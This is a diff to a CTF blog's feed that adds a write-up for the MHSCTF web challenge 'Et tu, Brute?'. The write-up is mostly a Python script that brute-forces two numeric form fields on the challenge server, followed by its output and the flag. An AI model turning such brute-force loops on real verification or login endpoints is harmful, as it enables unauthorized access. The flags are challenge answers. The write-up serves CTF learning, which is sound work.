@@ -548,6 +548,101 @@ Go to this <!-- raw HTML omitted -->website<!-- raw HTML omitted --> and see wha
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{1nclu51v17y_1of2_f7w_2of2_3d50f001}
 </span></span></code></pre></td></tr></table>
 </div>
+</div>]]></description></item><item><title>MHSCTF - Web - Et tu, Brute?</title><link>https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/</link><pubDate>Fri, 11 Mar 2022 14:57:15 +0100</pubDate><guid>https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/</guid><description><![CDATA[<div class="featured-image">
+                <img src="/featuredImages/brute-force-attack.png" referrerpolicy="no-referrer">
+            </div><h1 id="web---et-tu-brute---writeup">Web - Et tu, Brute? - writeup</h1>
+<h2 id="description">Description</h2>
+<p>I want to see how many people are actually my friends and aren&rsquo;t just pretending! Only my best friends get flags. You can check our friendship status at this website. mhsctf-ettubrute.0xmmalik.repl.co (you may need to wait for the site to wake up)</p>
+<h2 id="writeup">Writeup</h2>
+<p>So I went ahead and wrote a simple brute force program in python:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">requests.adapters</span> <span class="kn">import</span> <span class="n">HTTPAdapter</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">requests.packages.urllib3.util.retry</span> <span class="kn">import</span> <span class="n">Retry</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># the url we are going to post to </span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;https://mhsctf-ettubrute.0xmmalik.repl.co/status.php&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># the two parameters we need to bruteforce</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># they are integers between 1 and 100</span>
+</span></span><span class="line"><span class="cl"><span class="n">number</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">number2</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># define the &#39;failed&#39; response</span>
+</span></span><span class="line"><span class="cl"><span class="n">failed</span><span class="o">=</span><span class="s2">&#34;Sorry, you&#39;re clearly not my friend if you don&#39;t know my favorite and second favorite numbers!&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">retry</span> <span class="o">=</span> <span class="n">Retry</span><span class="p">(</span><span class="n">connect</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">backoff_factor</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">adapter</span> <span class="o">=</span> <span class="n">HTTPAdapter</span><span class="p">(</span><span class="n">max_retries</span><span class="o">=</span><span class="n">retry</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">mount</span><span class="p">(</span><span class="s1">&#39;http://&#39;</span><span class="p">,</span> <span class="n">adapter</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">mount</span><span class="p">(</span><span class="s1">&#39;https://&#39;</span><span class="p">,</span> <span class="n">adapter</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># iterate through the possible combinations using two nested for loops</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">number</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">number2</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="n">postobj</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;number&#39;</span><span class="p">:</span> <span class="n">number</span><span class="p">,</span> <span class="s1">&#39;number2&#39;</span><span class="p">:</span> <span class="n">number2</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="n">result</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">postobj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">text</span> <span class="o">!=</span> <span class="n">failed</span><span class="p">):</span> 
+</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;got the flag: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After some minutes of running my bruteforce utility i got the following response:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">got the flag: 
+</span></span><span class="line"><span class="cl">Wow! You must really be my friend if you know my favorite and second favorite numbers! Here&#39;s a flag for you: flag{pur3_s7r3ngth}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So the flag is</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{pur3_s7r3ngth}
+</span></span></code></pre></td></tr></table>
+</div>
 </div>]]></description></item><item><title>E-CTF - Web - Favourite Website</title><link>https://blog.ppeinecke.de/posts/ectf-web-favourite-website/</link><pubDate>Fri, 11 Mar 2022 01:14:24 +0100</pubDate><guid>https://blog.ppeinecke.de/posts/ectf-web-favourite-website/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/featuredImages/cookies.png" referrerpolicy="no-referrer">
             </div><h1 id="web---favourite-website---writeup">Web - Favourite Website - writeup</h1>
